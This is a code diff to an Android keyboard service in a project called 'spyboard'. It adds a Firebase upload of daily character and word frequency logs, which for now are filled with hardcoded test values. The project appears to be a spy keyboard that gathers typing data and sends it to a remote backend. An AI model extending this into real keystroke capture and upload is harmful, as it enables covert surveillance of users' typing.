@@ -7,8 +7,12 @@ import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
 
+import com.idankorenisraeli.spyboard.data.DailyUsageLog;
+import com.idankorenisraeli.spyboard.data.FirebaseManager;
 import com.idankorenisraeli.spyboard.utils.KeycodeDictionary;
 import com.idankorenisraeli.spyboard.R;
+
+import java.util.HashMap;
 
 /**
  * This class will simulate the functionality of an android keyboard,
@@ -44,7 +48,23 @@ public class SpyInputMethodService extends android.inputmethodservice.InputMetho
 
         keyboardView.setPreviewEnabled(false);
 
+        FirebaseManager firebaseManager = FirebaseManager.getInstance();
 
+
+        DailyUsageLog log = new DailyUsageLog();
+        HashMap<String, Integer> charFreq = new HashMap<>();
+        charFreq.put("k", 2);
+        charFreq.put("v", 3);
+        charFreq.put("c", 1);
+        log.setCharFreq(charFreq);
+
+        HashMap<String, Integer> wordsFreq = new HashMap<>();
+        wordsFreq.put("abc", 2);
+        wordsFreq.put("test", 1);
+
+        log.setWordFreq(wordsFreq);
+
+        firebaseManager.saveDailyLog(log);
 
         return keyboardView;
     }
